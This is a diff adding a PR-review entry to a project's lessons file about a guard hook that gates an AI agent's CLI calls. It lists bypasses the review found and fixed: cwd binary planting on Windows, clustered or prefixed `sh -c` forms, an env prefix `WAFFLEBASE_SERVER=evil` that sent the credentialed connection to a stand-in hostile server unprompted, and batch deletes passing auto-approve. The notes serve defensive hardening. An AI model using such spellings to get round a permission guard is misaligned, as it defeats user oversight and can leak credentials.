@@ -124,3 +124,41 @@ Six findings, all valid, all fixed with tests:
 `--` meaning "end of options, rest positional" is the POSIX convention;
 commander's subcommand dispatch does not honour it. Every guard rule
 about argv should be checked against the real binary once.
+
+### PR review — agent review panel on #1097 (2026-10-07)
+
+Panel ran on `01b7a8d9` (before the CodeRabbit fixes): 6 blocking.
+One (`--` before a subcommand) was already fixed. The other five, fixed
+with tests:
+- **Windows cwd binary planting:** `shell: true` makes cmd.exe resolve
+  `wafflebase.cmd` from the cwd before PATH — a cloned repo could run code
+  at session start. Now resolved from PATH by hand, spawned by absolute
+  path.
+- **Clustered `-c`** (`bash -lc`, `sh -ec`) and prefixed shells
+  (`FOO=1 sh -c`, `time bash -c`) hid the inner call (counted twice by
+  the panel, from two lenses).
+- **Env spelling of the credential gate:** `WAFFLEBASE_SERVER=evil
+  wafflebase docs list` was `null`, not `ask`. Any `WAFFLEBASE_*=` or
+  `HOME=` prefix now counts as a connection change.
+- **`cells batch` with `null` deletes** but was plain `write`, so
+  auto-approve let it through. Registry now carries the variant, and the
+  guard reads an inline `--data` payload to tell a delete from an edit.
+
+Suggestions taken: references mirrored into one dir (sibling links were
+broken by per-skill copies; drift test now catches stale files), CLI
+version and other spawned output quoted, `--api-key` value no longer
+echoed, `WAFFLEBASE_WEB_URL` keeps its basename, knip.json formatting
+restored, lint-config test states the new scope, hooks.json wiring and
+missing session branches tested.
+
+Declined with reasons (PR reply): the dependency overrides stay — the
+gate fails every branch without them; `allow` does not bypass a user's
+explicit deny rules (Claude Code docs), so that nit does not hold; build
+tooling in `src/plugin/` is not bundled (tsup's single `bin.ts` entry)
+and is covered by the CLI's typecheck.
+
+**Lesson — every way to say a thing is a way around a rule about it.**
+`--server` had an env spelling; `-c` had a clustered spelling; "delete
+a cell" had a batch spelling. When a guard keys on one surface form,
+enumerate the others from the program's own parser (`resolveConfig`,
+getopt clusters, the registry's semantics), not from the first form.
